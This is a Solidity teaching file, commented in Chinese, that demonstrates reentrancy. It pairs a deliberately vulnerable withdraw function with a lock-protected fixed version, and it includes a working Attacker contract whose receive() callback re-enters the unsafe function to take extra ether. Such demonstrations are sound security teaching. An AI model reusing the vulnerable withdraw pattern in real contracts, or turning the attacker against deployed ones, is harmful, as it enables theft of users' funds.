// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title 重入攻击防护合约
 * @dev 演示如何防止重入攻击的合约示例
 */
contract ReentrancyGuard {
    // 重入锁
    bool private locked;

    // 防止重入的修饰器
    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    // 用户余额映射
    mapping(address => uint256) public balances;

    // 存款事件
    event Deposit(address indexed sender, uint256 amount);
    // 提款事件
    event Withdraw(address indexed recipient, uint256 amount);

    /**
     * @dev 存款函数
     */
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev 不安全的提款函数 - 容易受到重入攻击
     */
    function unsafeWithdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");
        
        // 危险：在更新状态前发送以太币
        // 这可能导致重入攻击
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // 状态更新发生在转账之后，可能导致重入攻击
        balances[msg.sender] = 0;
        
        emit Withdraw(msg.sender, amount);
    }

    /**
     * @dev 安全的提款函数 - 使用重入锁防止重入攻击
     */
    function safeWithdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");
        
        // 先更新状态，再发送以太币
        balances[msg.sender] = 0;
        
        // 安全：状态已更新，即使重入也无法再次提取资金
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdraw(msg.sender, amount);
    }

    /**
     * @dev 获取合约余额
     */
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title 攻击者合约
 * @dev 演示如何执行重入攻击的合约
 */
contract Attacker {
    ReentrancyGuard public target;
    address public owner;
    
    // 记录攻击是否成功
    bool public attackCompleted;
    
    // 构造函数，设置目标合约
    constructor(address _target) {
        target = ReentrancyGuard(_target);
        owner = msg.sender;
    }
    
    // 接收以太币的回调函数，用于执行重入攻击
    receive() external payable {
        if (address(target).balance >= 1 ether && !attackCompleted) {
            // 在接收到以太币时，再次调用提款函数，形成重入
            attackCompleted = true;
            target.unsafeWithdraw();
        }
    }
    
    // 开始攻击
    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value >= 1 ether, "Need 1 ether to attack");
        
        // 先存款
        target.deposit{value: 1 ether}();
        
        // 然后尝试提款，触发重入攻击
        target.unsafeWithdraw();
    }
    
    // 尝试攻击安全的提款函数
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value >= 1 ether, "Need 1 ether to attack");
        
        // 先存款
        target.deposit{value: 1 ether}();
        
        // 尝试攻击安全的提款函数
        target.safeWithdraw();
    }
    
    // 获取攻击者合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    // 提取攻击所得
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}